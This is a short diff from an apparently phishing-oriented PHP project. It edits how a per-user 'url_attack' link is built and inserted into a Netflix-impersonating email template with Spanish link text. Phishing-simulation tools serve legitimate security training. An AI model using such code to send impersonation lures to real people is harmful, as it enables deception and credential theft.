@@ -123,7 +123,7 @@ foreach ($user_id as $uid) {
         <br>
         <a href='http://localhost/phishingBE/v2/netflix.php?uid=$vid' >Click en el siguiente link</a>";
     }else{
-        $url_attack = 'http://'.$phishing_url.'/?uid='.$vid;
+        $url_attack = $phishing_url.'/?uid='.$vid;
         $mailContent = netflix($url_attack); 
     
     }
